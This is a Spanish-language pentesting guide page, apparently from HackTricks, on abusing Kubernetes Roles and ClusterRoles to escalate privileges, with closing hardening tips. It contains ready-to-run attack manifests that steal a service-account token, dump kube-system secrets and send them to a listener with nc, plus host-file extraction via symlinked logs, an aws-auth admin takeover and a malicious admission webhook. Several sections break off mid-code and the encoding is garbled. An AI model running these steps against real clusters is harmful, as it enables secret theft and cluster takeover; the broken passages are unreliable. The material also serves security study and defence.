# Abusando de Roles/ClusterRoles en Kubernetes

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

Aqu√≠ puedes encontrar algunas configuraciones de Roles y ClusterRoles potencialmente peligrosas.\
Recuerda que puedes obtener todos los recursos compatibles con `kubectl api-resources`

## **Escalada de privilegios**

Refiri√©ndonos como el arte de obtener **acceso a un principal diferente** dentro del cl√∫ster **con diferentes privilegios** (dentro del cl√∫ster de Kubernetes o a nubes externas) que los que ya tienes, en Kubernetes hay b√°sicamente **4 t√©cnicas principales para escalar privilegios**:

* Ser capaz de **suplantar** a otros usuarios/grupos/SA con mejores privilegios dentro del cl√∫ster de Kubernetes o a nubes externas.
* Ser capaz de **crear/patchear/ejecutar pods** donde puedes **encontrar o adjuntar SAs** con mejores privilegios dentro del cl√∫ster de Kubernetes o a nubes externas.
* Ser capaz de **leer secretos** ya que los tokens de los SAs se almacenan como secretos.
* Ser capaz de **escapar al nodo** desde un contenedor, donde puedes robar todos los secretos de los contenedores que se ejecutan en el nodo, las credenciales del nodo y los permisos del nodo dentro de la nube en la que se est√° ejecutando (si la hay).
* Una quinta t√©cnica que merece menci√≥n es la capacidad de **ejecutar port-forward** en un pod, ya que puede ser capaz de acceder a recursos interesantes dentro de ese pod.

### **Acceso a cualquier recurso o verbo (comod√≠n)**

Este privilegio proporciona acceso a **cualquier recurso con cualquier verbo**. Es el privilegio m√°s sustancial que un usuario puede obtener, especialmente si este privilegio tambi√©n es un "ClusterRole". Si es un "ClusterRole", entonces el usuario puede acceder a los recursos de cualquier espacio de nombres y ser propietario del cl√∫ster con ese permiso.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

### **Acceso a cualquier recurso**

Dar permiso a un usuario para **acceder a cualquier recurso puede ser muy arriesgado**. Pero, **¬øqu√© verbos** permiten el acceso a estos recursos? Aqu√≠ hay algunos permisos RBAC peligrosos que pueden da√±ar todo el cl√∫ster:

* **resources: \["\*"] verbs: \["create"]** ‚Äì Este privilegio puede **crear cualquier recurso** en el cl√∫ster, como **pods**, roles, etc. Un atacante podr√≠a abusar de √©l para **escalar privilegios**. Un ejemplo de esto se puede encontrar en la secci√≥n **"Creaci√≥n de pods"**.
* **resources: \["\*"] verbs: \["list"]** ‚Äì La capacidad de listar cualquier recurso se puede utilizar para **filtrar secretos de otros usuarios** y podr√≠a facilitar la **escalada de privilegios**. Un ejemplo de esto se encuentra en la secci√≥n **"Listado de secretos"**.
* **resources: \["\*"] verbs: \["get"]-** Este privilegio se puede utilizar para **obtener secretos de otros cuentas de servicio**.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["create", "list", "get"]
```

### Creaci√≥n de Pod - Robar Token

Un atacante con permiso para crear un pod en el espacio de nombres "kube-system" puede crear contenedores de criptomonedas, por ejemplo. Adem√°s, si hay una **cuenta de servicio con permisos privilegiados, al ejecutar un pod con ese servicio se pueden abusar de los permisos para escalar privilegios**.

Aqu√≠ tenemos una cuenta privilegiada predeterminada llamada _bootstrap-signer_ con permisos para listar todos los secretos.

![](https://www.cyberark.com/wp-content/uploads/2018/12/rolebinding\_with\_cluster\_admin\_clusterrole-1024x545.png)

El atacante puede crear un pod malicioso que utilizar√° el servicio privilegiado. Luego, abusando del token de servicio, exfiltrar√° los secretos:

![](https://www.cyberark.com/wp-content/uploads/2018/12/pods\_yaml\_with\_autoamountServiceAccountToken-1024x345.png)

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```

En la imagen anterior, observe c√≥mo se utiliza el servicio _bootstrap-signer_ en_ `serviceAccountname`_._

Simplemente cree el pod malicioso y espere los secretos en el puerto 6666:

### **Creaci√≥n de Pod y Escape**

La siguiente definici√≥n da todos los privilegios que un contenedor puede tener:

* **Acceso privilegiado** (desactivando protecciones y estableciendo capacidades)
* **Desactivar los espacios de nombres hostIPC y hostPid** que pueden ayudar a escalar privilegios
* **Desactivar el espacio de nombres hostNetwork**, dando acceso para robar los privilegios de la nube de los nodos y un mejor acceso a las redes
* **Montar /hosts dentro del contenedor**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ubuntu
  labels:
    app: ubuntu
spec:
  # Uncomment and specify a specific node you want to debug
  # nodeName: <insert-node-name-here>
  containers:
  - image: ubuntu
    command:
      - "sleep"
      - "3600" # adjust this as needed -- use only as long as you need
    imagePullPolicy: IfNotPresent
    name: ubuntu
    securityContext:
      allowPrivilegeEscalation: true
      privileged: true
      #capabilities:
      #  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org
### Crear Pod - Moverse a la nube

Si puedes **crear** un **pod** (y opcionalmente una **cuenta de servicio**), podr√≠as ser capaz de **obtener privilegios en el entorno de la nube** al **asignar roles de nube a un pod o una cuenta de servicio** y luego acceder a √©l.\
Adem√°s, si puedes crear un **pod con el espacio de nombres de red del host**, puedes **robar el rol IAM** de la **instancia del nodo**.

Para obtener m√°s informaci√≥n, consulta:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Crear/Parchear Despliegues, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Trabajos y Cronjobs**

Despliegues, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Trabajos y Cronjobs son todos privilegios que permiten la creaci√≥n de diferentes tareas en el cl√∫ster. Adem√°s, es posible usar todos ellos para **desarrollar pods e incluso crear pods**. Por lo tanto, es posible **abusar de ellos para escalar privilegios como en el ejemplo anterior**.

Supongamos que tenemos el **permiso para crear un Daemonset** y creamos el siguiente archivo YAML. Este archivo YAML est√° configurado para hacer los mismos pasos que mencionamos en la secci√≥n "crear pods".

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: alpine
  namespace: kube-system
spec:
  selector:
    matchLabels:
      name: alpine
  template:
    metadata:
      labels:
        name: alpine
    spec:
      serviceAccountName: bootstrap-signer
      automountServiceAccountToken: true
      hostNetwork: true
      containers:
      - name: alpine
        image: alpine
        command: ["/bin/sh"]
        args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
        volumeMounts:
        - mountPath: /root
          name: mount-node-root
      volumes:
      - name: mount-node-root
        hostPath:
          path: /
```

En la l√≠nea 6 se encuentra el objeto "spec" y los objetos secundarios como "template" en la l√≠nea 10. Estos objetos contienen la configuraci√≥n para la tarea que deseamos realizar. Otra cosa a tener en cuenta es el "**serviceAccountName**" en la l√≠nea 15 y el objeto "**containers**" en la l√≠nea 18. Esta es la parte que se relaciona con la creaci√≥n de nuestro contenedor malicioso.

La documentaci√≥n de la API de Kubernetes indica que el punto final "PodTemplateSpec" tiene la opci√≥n de crear contenedores. Y, como se puede ver: **despliegues, daemonsets, statefulsets, replicationcontrollers, replicasets, trabajos y cronjobs todos se pueden usar para crear pods**:

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-8.png)

**Por lo tanto, el privilegio de crear o actualizar tareas tambi√©n se puede abusar para la escalada de privilegios en el cl√∫ster.**

### **Pods Exec**

**`pods/exec`** es un recurso en Kubernetes utilizado para **ejecutar comandos en una shell dentro de un pod**. Este privilegio est√° destinado a los administradores que desean **acceder a los contenedores y ejecutar comandos**. Es como crear una sesi√≥n SSH para el contenedor.

Si tenemos este privilegio, en realidad obtenemos la capacidad de **tomar el control de todos los pods**. Para hacer eso, necesitamos usar el siguiente comando:

```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```

Tenga en cuenta que como puede ingresar en cualquier pod, puede abusar del token de otros pods como en la explotaci√≥n de **Creaci√≥n de Pod** para intentar escalar privilegios.

### port-forward

Este permiso permite **reenviar un puerto local a un puerto en el pod especificado**. Esto est√° destinado a poder depurar aplicaciones que se ejecutan dentro de un pod f√°cilmente, pero un atacante podr√≠a abusar de √©l para obtener acceso a aplicaciones interesantes (como bases de datos) o vulnerables (¬øwebs?) dentro de un pod:

```
kubectl port-forward pod/mypod 5000:5000
```

### **Hosts Writable /var/log/ Escape**

Como [**se indica en esta investigaci√≥n**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), si puedes acceder o crear un pod con el directorio `/var/log/` del host montado en √©l, puedes **escapar del contenedor**.\
B√°sicamente, esto se debe a que cuando el **Kube-API intenta obtener los registros** de un contenedor (usando `kubectl logs <pod>`), solicita el archivo `0.log` del pod usando el punto final `/logs/` del servicio **Kubelet**.\
El servicio Kubelet expone el punto final `/logs/`, que b√°sicamente **expone el sistema de archivos `/var/log` del contenedor**.

Por lo tanto, un atacante con **acceso de escritura en la carpeta /var/log/** del contenedor podr√≠a abusar de este comportamiento de 2 maneras:

* Modificando el archivo `0.log` de su contenedor (generalmente ubicado en `/var/logs/pods/namespace_pod_uid/container/0.log`) para que sea un **enlace simb√≥lico que apunte a `/etc/shadow`** por ejemplo. Luego, podr√° extraer el archivo shadow del host haciendo:

```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Sigue incrementando la cola para extraer todo el archivo
```

* Si el atacante controla alg√∫n principal con los **permisos para leer `nodes/log`**, simplemente puede crear un **enlace simb√≥lico** en `/host-mounted/var/log/sym` a `/` y cuando **accede a `https://<gateway>:10250/logs/sym/` se enumerar√° el sistema de archivos ra√≠z del host** (cambiando el enlace simb√≥lico puede proporcionar acceso a archivos).

```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
### **Listando Secretos**

El privilegio de **listar secretos** es una capacidad fuerte que se tiene en el cl√∫ster. Un usuario con el permiso para listar secretos puede **potencialmente ver todos los secretos en el cl√∫ster, incluyendo las claves de administrador**. La clave secreta es un token JWT codificado en base64.

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_role.png)

Un atacante que obtiene **acceso a \_list secrets**\_ en el cl√∫ster puede usar los siguientes comandos _curl_ para obtener todos los secretos en el espacio de nombres "kube-system":

```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-2.png)

### **Leyendo un secreto - forzando IDs de tokens**

Un atacante que encontr√≥ un token con permiso para leer un secreto no puede usar este permiso sin conocer el nombre completo del secreto. Este permiso es diferente del permiso de _**listar**_ _**secretos**_ descrito anteriormente.

![](https://www.cyberark.com/wp-content/uploads/2018/12/getting\_secret\_clusterRole.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRoleBinding\_with\_get\_secrets\_clusterRole.png)

Aunque el atacante no conoce el nombre del secreto, hay cuentas de servicio predeterminadas que se pueden enlistar.

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_accounts\_list.png)

Cada cuenta de servicio tiene un secreto asociado con un prefijo est√°tico (no cambiante) y un sufijo de una cadena de cinco caracteres alfanum√©ricos aleatorios al final.

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_account\_on\_kube\_system\_namespace-1024x556.png)

La estructura de token aleatorio es una cadena de 5 caracteres construida a partir de caracteres alfanum√©ricos (letras min√∫sculas y d√≠gitos). **Pero no contiene todas las letras y d√≠gitos.**

Cuando se mira dentro del [c√≥digo fuente](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83), parece que el token se genera a partir de solo 27 caracteres "bcdfghjklmnpqrstvwxz2456789" y no 36 (a-z y 0-9).

![](https://www.cyberark.com/wp-content/uploads/2018/12/character\_set\_from\_rand\_go.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/comments\_on\_removing\_characters\_rand\_go\_character\_set-1024x138.png)

Esto significa que hay 275 = 14,348,907 posibilidades para un token.

Un atacante puede ejecutar un ataque de fuerza bruta para adivinar el ID del token en un par de horas. Si tiene √©xito en obtener secretos de cuentas de servicio predeterminadas sensibles, podr√° escalar privilegios.

### Solicitudes de firma de certificados

Si tiene los verbos **`create`** en el recurso `certificatesigningrequests` (o al menos en `certificatesigningrequests/nodeClient`). Puede **crear** un nuevo CeSR de un **nuevo nodo**.

Seg√∫n la [documentaci√≥n, es posible aprobar autom√°ticamente estas solicitudes](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), por lo que en ese caso **no necesita permisos adicionales**. De lo contrario, deber√° poder aprobar la solicitud, lo que significa actualizar en `certificatesigningrequests/approval` y `approve` en `signers` con el nombre de recurso `<signerNameDomain>/<signerNamePath>` o `<signerNameDomain>/*`

Un **ejemplo de un rol** con todos los permisos necesarios es:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: csr-approver
rules:
- apiGroups:
  - certificates.k8s.io
  resources:
  - certificatesigningrequests
  verbs:
  - get
  - list
  - watch
  - create
- apiGroups:
  - certificates.k8s.io
  resources:
  - certificatesigningrequests/approval
  verbs:
  - update
- apiGroups:
  - certificates.k8s.io
  resources:
  - signers
  resourceNames:
  - example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
  verbs:
  - approve
```

Por lo tanto, con el nuevo nodo CSR aprobado, puede **abusar** de los permisos especiales de los nodos para **robar secretos** y **escalar privilegios**.

En [**esta publicaci√≥n**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) y [**esta otra**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) la configuraci√≥n de GKE K8s TLS Bootstrap se configura con **firma autom√°tica** y se abusa para generar credenciales de un nuevo nodo K8s y luego abusar de ellos para escalar privilegios robando secretos.\
Si **tiene los privilegios mencionados, podr√≠a hacer lo mismo**. Tenga en cuenta que el primer ejemplo omite el error que impide que un nuevo nodo acceda a secretos dentro de los contenedores porque un **nodo solo puede acceder a los secretos de los contenedores montados en √©l**.

La forma de evitar esto es simplemente **crear credenciales de nodo para el nombre del nodo donde se monta el contenedor con los secretos interesantes** (pero solo verifique c√≥mo hacerlo en la primera publicaci√≥n):

```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```

### AWS EKS aws-auth configmaps

Los principales que pueden modificar **`configmaps`** en el espacio de nombres kube-system en cl√∫steres EKS (necesitan estar en AWS) pueden obtener privilegios de administrador de cl√∫ster sobrescribiendo el configmap **aws-auth**.\
Los verbos necesarios son **`update`** y **`patch`**, o **`create`** si no se cre√≥ el configmap:

{% code overflow="wrap" %}
```bash
# Verifique si existe el configmap
get configmap aws-auth -n kube-system -o yaml

## Ejemplo de Yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: aws-auth
  namespace: kube-system
data:
  mapRoles: |
    - rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
      username: system:node:{{EC2PrivateDNSName}}
      groups:
        - system:masters

# Cree el mapa de configuraci√≥n si no existe
## Usando kubectl y el yaml anterior
kubectl apply -f /tmp/aws-auth.yaml
## Usando eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modif√≠quelo
### Crear tokens de serviceaccounts

Los principios que pueden **crear TokenRequests** (`serviceaccounts/token`) pueden emitir tokens para SA equivalentes a administrador (informaci√≥n de [**aqu√≠**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Los principios que pueden **`actualizar`** o **`parchear`** **`pods/ephemeralcontainers`** pueden obtener **ejecuci√≥n de c√≥digo en otros pods**, y potencialmente **escapar** a su nodo agregando un contenedor ef√≠mero con un securityContext privilegiado.

### ValidatingWebhookConfigurations o MutatingWebhookConfigurations

Los principios con cualquiera de los verbos `create`, `update` o `patch` sobre `validatingwebhookconfigurations` o `mutatingwebhookconfigurations` podr√≠an ser capaces de **crear uno de esos webhookconfigurations** para poder **escalar privilegios**.

Para un ejemplo de [`mutatingwebhookconfigurations` consulte esta secci√≥n de esta publicaci√≥n](./#malicious-admission-controller).

### Escalar

Como se puede leer en la siguiente secci√≥n: [**Prevenci√≥n de escalada de privilegios privilegiados integrados**](./#built-in-privileged-escalation-prevention), un principio no puede actualizar ni crear roles o clusterroles sin tener √©l mismo esos nuevos permisos. Excepto si tiene el **verbo `escalate`** sobre **`roles`** o **`clusterroles`.**\
Entonces puede actualizar/crear nuevos roles, clusterroles con mejores permisos que los que tiene.

### Proxy de nodos

Los principios con acceso al subrecurso **`nodes/proxy`** pueden **ejecutar c√≥digo en pods** a trav√©s de la API Kubelet (seg√∫n [**esto**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). M√°s informaci√≥n sobre la autenticaci√≥n de Kubelet en esta p√°gina:

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Tiene un ejemplo de c√≥mo obtener [**RCE hablando autorizado a una API de Kubelet aqu√≠**](../pentesting-kubernetes-services.md#kubelet-rce).

### Eliminar pods + nodos no programables

Los principios que pueden **eliminar pods** (verbo `delete` sobre el recurso `pods`), o **evacuar pods** (verbo `create` sobre el recurso `pods/eviction`), o **cambiar el estado del pod** (acceso a `pods/status`) y pueden **hacer que otros nodos no sean programables** (acceso a `nodes/status`) o **eliminar nodos** (verbo `delete` sobre el recurso `nodes`) y tienen control sobre un pod, podr√≠an **robar pods de otros nodos** para que se **ejecuten** en el **nodo comprometido** y el atacante pueda **robar los tokens** de esos pods.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
    curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Estado de servicios (CVE-2020-8554)

Los principios que pueden **modificar** **`services/status`** pueden establecer el campo `status.loadBalancer.ingress.ip` para explotar el **CVE-2020-8554 no corregido** y lanzar **ataques MiTM contra el cl√∫ster**. La mayor√≠a de las mitigaciones para CVE-2020-8554 solo previenen los servicios ExternalIP (seg√∫n [**esto**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Estado de nodos y pods

Los principios con permisos de **`actualizaci√≥n`** o **`parcheo`** sobre `nodes/status` o `pods/status`, podr√≠an modificar etiquetas para afectar las restricciones de programaci√≥n impuestas.

## Prevenci√≥n de escalada de privilegios privilegiados integrados

Aunque puede haber permisos riesgosos, Kubernetes est√° haciendo un buen trabajo previniendo otros tipos de permisos con potencial para la escalada de privilegios.

Kubernetes tiene un [mecanismo integrado](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) para eso:

> La API RBAC **impide que los usuarios escalen privilegios** editando roles o vinculaciones de roles. Debido a que esto se aplica a nivel de API, se aplica incluso cuando el autorizador RBAC no est√° en uso.
>
> Un usuario solo puede **crear/actualizar un rol si ya tiene todos los permisos contenidos en el rol**, en el mismo √°mbito que el rol (en todo el cl√∫ster para un ClusterRole, dentro del mismo espacio de nombres o en todo el cl√∫ster para un Role)

{% hint style="warning" %}
Hay una excepci√≥n a la regla anterior. Si un principio tiene el **verbo `escalate`** sobre **`roles`** o **`clusterroles`** puede aumentar los privilegios de roles y clusterroles incluso sin tener los permisos √©l mismo.
{% endhint %}

Veamos un ejemplo de tal prevenci√≥n.

Una cuenta de servicio llamada _sa7_ est√° en un RoleBinding _edit-role-rolebinding_. Este objeto RoleBinding tiene un rol llamado _edit-role_ que tiene reglas de permisos **completas** en roles. Te√≥ricamente, significa que la cuenta de servicio puede **editar cualquier rol** en el espacio de nombres _default_.

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_roles\_roleBinding\_binding\_sa7\_to\_edit\_role.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/role\_to\_edit\_any\_role.png)

Tambi√©n existe un rol existente llamado _list-pods_. Cualquiera con este rol puede listar todos los pods en el espacio de nombres _default_. El usuario _sa7_ deber√≠a tener permisos para editar cualquier rol, as√≠ que veamos qu√© sucede cuando intenta agregar el recurso "secrets" a los recursos del rol.

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_role\_resources-300x66.png)

Despu√©s de intentar hacerlo, recibiremos un error "forbidden: attempt to grant extra privileges" (Figura 31), porque aunque nuestro usuario _sa7_ tiene permisos para actualizar roles para cualquier recurso, solo puede actualizar el rol para los recursos que tiene permisos.

![](https://www.cyberark.com/wp-content/uploads/2018/12/forbidden\_attempt\_to\_gran\_extra\_privileges\_message-1024x288.png)

### **Obtener y parchear RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Aparentemente esta t√©cnica funcionaba antes, pero seg√∫n mis pruebas ya no funciona por la misma raz√≥n explicada en la secci√≥n anterior. No puedes crear/modificar un rolebinding para darte a ti mismo o a un SA diferente algunos privilegios si no los tienes ya.**
{% endhint %}

El privilegio de crear Rolebindings permite a un usuario **vincular roles a una cuenta de servicio**. Este privilegio puede llevar potencialmente a la escalada de privilegios porque **permite al usuario vincular privilegios de administrador a una cuenta de servicio comprometida.**

El siguiente ClusterRole est√° utilizando el verbo especial _bind_ que permite a un
#### Crear una aplicaci√≥n de proxy lateral <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Crea tu archivo .yaml

```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```

Edita tu archivo .yaml y agrega las l√≠neas sin comentar:

```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
    command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
    securityContext:
      capabilities:
        add: ["NET_ADMIN"]
 #   volumeMounts:
 #   - name: sec-ctx-vol
 #     mountPath: /data/demo
 #   securityContext:
 #     allowPrivilegeEscalation: true
```

Ver los registros del proxy:

```bash
kubectl logs app -C proxy
```

M√°s informaci√≥n en: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Controlador de admisi√≥n malicioso

Un controlador de admisi√≥n es un fragmento de c√≥digo que **intercepta las solicitudes al servidor de API de Kubernetes** antes de la persistencia del objeto, pero **despu√©s de que la solicitud est√© autenticada** y **autorizada**.

Si un atacante de alguna manera logra **inyectar un controlador de admisi√≥n de mutaci√≥n**, podr√° **modificar solicitudes ya autenticadas**. Siendo capaz de potencialmente escalar privilegios, y m√°s com√∫nmente persistir en el cl√∫ster.

Ejemplo de [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):

```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```

Espere hasta que el servidor webhook est√© listo. Verifique el estado:

```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```

![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Una vez que tenemos nuestro controlador de admisi√≥n de mutaci√≥n malicioso en ejecuci√≥n, vamos a implementar un nuevo pod.

```bash
kubectl run nginx --image nginx
kubectl get po -w
```

Espere nuevamente, hasta que vea el cambio en el estado del pod. Ahora, puede ver el error `ErrImagePull`. Verifique el nombre de la imagen con cualquiera de las consultas.

```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```

![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Como se puede ver en la imagen anterior, intentamos ejecutar la imagen `nginx`, pero la imagen ejecutada finalmente es `rewanthtammana/malicious-image`. ¬øQu√© acaba de pasar!!?

#### Aspectos t√©cnicos <a href="#heading-technicalities" id="heading-technicalities"></a>

Desplegaremos lo que acaba de suceder. El script `./deploy.sh` que ejecut√≥, cre√≥ un controlador de admisi√≥n de mutaci√≥n webhook. Las siguientes l√≠neas en el controlador de admisi√≥n de mutaci√≥n son responsables de los resultados anteriores.

```
patches = append(patches, patchOperation{
    Op:    "replace",
    Path:  "/spec/containers/0/image",
    Value: "rewanthtammana/malicious-image",
})
```

El fragmento anterior reemplaza la primera imagen del contenedor en cada pod con `rewanthtammana/malicious-image`.

## Mejores pr√°cticas

### **Evitar el montaje autom√°tico de tokens de cuenta de servicio en pods**

Cuando se crea un pod, autom√°ticamente se monta una cuenta de servicio (la predeterminada es la cuenta de servicio predeterminada en el mismo espacio de nombres). No todos los pods necesitan la capacidad de utilizar la API desde s√≠ mismos.

A partir de la versi√≥n 1.6+, es posible evitar el montaje autom√°tico de tokens de cuenta de servicio en pods utilizando automountServiceAccountToken: false. Se puede usar en cuentas de servicio o pods.

En una cuenta de servicio, se debe agregar de la siguiente manera:\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/serviceAccount\_with\_autoamountServiceAccountToken\_false.png)

Tambi√©n es posible usarlo en el pod:\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/pod\_with\_autoamountServiceAccountToken\_false.png)

### **Conceder permisos espec√≠ficos a RoleBindings\ClusterRoleBindings**

Al crear RoleBindings\ClusterRoleBindings, aseg√∫rese de que solo los usuarios que necesitan el rol en el enlace est√©n dentro. Es f√°cil olvidar a los usuarios que ya no son relevantes dentro de dichos grupos.

### **Usar Roles y RoleBindings en lugar de ClusterRoles y ClusterRoleBindings**

Al usar ClusterRoles y ClusterRoleBindings, se aplica en todo el cl√∫ster. Un usuario en dicho grupo tiene sus permisos sobre todos los espacios de nombres, lo cual a veces es innecesario. Los Roles y RoleBindings se pueden aplicar en un espacio de nombres espec√≠fico y proporcionan otra capa de seguridad.

### **Usar herramientas automatizadas**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referencias**

{% embed url="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions" %}

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1" %}

***

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si desea ver su **empresa anunciada en HackTricks** o si desea acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulte los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
